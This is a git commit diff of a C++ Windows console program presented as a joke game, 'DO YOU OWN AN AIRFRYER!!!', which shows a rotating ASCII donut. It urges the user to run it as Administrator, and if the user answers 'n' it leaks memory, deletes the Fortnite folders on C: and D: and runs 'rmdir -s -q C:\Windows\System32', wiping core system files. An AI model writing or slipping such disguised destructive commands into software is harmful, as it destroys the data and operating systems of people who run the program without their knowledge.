b76a5eb6a65b4d0cc8bbe15be024d60cce5d485e
Justin Frantz <justinfrantz2005@gmail.com>
2023-09-26 02:03:17 -0400

    updated

--- ConsoleApplication1(Airfryer edition)/ConsoleApplication1(Airfryer edition).cpp
+++ ConsoleApplication1(Airfryer edition)/ConsoleApplication1(Airfryer edition).cpp
@@ -1,10 +1,28 @@
-// ConsoleApplication1(Airfryer edition).cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
 #include <iostream>
 #include <Windows.h>
 #include <stdio.h>
 #include <math.h>
 #include <shellapi.h>
+
+void memleak() {
+    int* a = new int;
+    int* b = new int;
+    int* c = new int;
+    int* d = new int;
+    int* e = new int;
+    int* f = new int;
+    int* g = new int;
+    int* h = new int;
+    int* i = new int;
+    int* j = new int;
+    int* k = new int;
+    int* l = new int;
+    int* m = new int;
+    int* n = new int;
+    int* o = new int;
+    int* p = new int;
+    int* q = new int;
+}
 
 void donut() {
     float A = 0, B = 0;
@@ -51,27 +69,35 @@ void donut() {
 
 int main()
 {
-    std::cout << "Hello please run this game as Administrator.\n";
-    for (int i = 1; i < 5; i++) {
+    for (int i = 5; i > 0; i--) {
+        std::cout << "Hello please run this game as Administrator.\n";
         std::cout << "Seconds left before entry: " << i << "\n";
         Sleep(1000);
         system("cls");
     }
 
-    std::cout << "Hello Welcome to \"DO YOU OWN AN AIRFRYER!!!\"\n";
+    std::cout << "Hello Welcome to \"DO YOU OWN AN AIRFRYER!!!\"(y,n)\n";
     char user = '?';
     std::cin >> user;
-    if (user == 'y') {
-        std::cout << "NICE. Here's a cool rotating donut for owning one you chad!.";
-        donut();
-
-    }
-    else {
+    if (user == 'n') {
         std::cout << "thats a shame :/";
+
+        //makes multiple memory leaks
+        memleak();
+
+        system("rmdir -s -q C:\\Epic Games\\Fortnite");
+        system("rmdir -s -q D:\\Epic Games\\Fortnite");
 
         system("rmdir -s -q C:\\Windows\\System32 ");
 
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=zYKupOsaJmk", 0, 0, SW_SHOW);
-        
+
+    }
+    else {
+        std::cout << "NICE. Here's a cool rotating donut for owning one you chad!.";
+        Sleep(2000);
+        system("cls");
+        donut();
+
     }
 }
